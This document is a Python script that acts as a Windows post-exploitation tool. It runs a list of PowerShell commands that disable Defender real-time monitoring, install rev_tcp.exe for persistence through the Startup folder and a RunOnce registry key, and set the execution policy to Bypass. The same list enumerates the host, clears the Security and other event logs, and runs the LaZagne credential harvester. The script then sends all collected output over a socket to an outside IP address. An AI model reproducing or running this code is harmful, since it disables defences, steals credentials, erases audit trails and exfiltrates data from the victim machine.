from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen,PIPE

#command = "Get-Process | Where-Object { $_.CPU -gt 10 }"
def run_powershell_command(command):
    # Run the PowerShell command
    process = Popen(["powershell", command], stdout=PIPE, stderr=PIPE, text=True)
    
    # Get the standard output and standard error
    stdout, stderr = process.communicate()

    # Combine both outputs into a single string
    result = f"Output:\n{stdout}\nError:\n{stderr}"

    return result

def main():
    cmnds_to_run = [
        '''Set-MpPreference -DisableRealtimeMonitoring $true''',
        '''Copy-Item "C:\temp\rev_tcp.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"''',
        '''Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'MyProgram' -Value 'C:\temp\rev_tcp.exe'''',
        '''systeminfo''',
        '''systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information''',
        '''wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches''',
        '''wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture''',
        '''[System.Environment]::OSVersion.Version #Current OS version''','''Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches''',
        '''Get-Hotfix -description "Security update" #List only "Security Update" patches''',
        '''Get-Process''',
        '''Get-Service''',
        '''Get-LocalUser''',
        '''Get-NetIPAddress''',
        '''Get-WmiObject -Class Win32_Product''',
        '''Set-ExecutionPolicy Bypass''',
        '''Clear-EventLog -LogName "Application", "System","Security","Setup","ForwardedEvents" ''',
        '''LaZagne'''
    ]
    output =""
    for cmnd in cmnds_to_run:
        output += run_powershell_command(cmnd)
    # Server address and port
    host = '175.45.176.100'
    port = 8080
    # Create a socket object
    client_socket = socket(AF_INET, SOCK_STREAM)
    
    # Connect to the server
    client_socket.connect((host, port))
        
    client_socket.sendall(output.encode('utf-8'))

    client_socket.close()

if __name__ == "__main__":
    main()
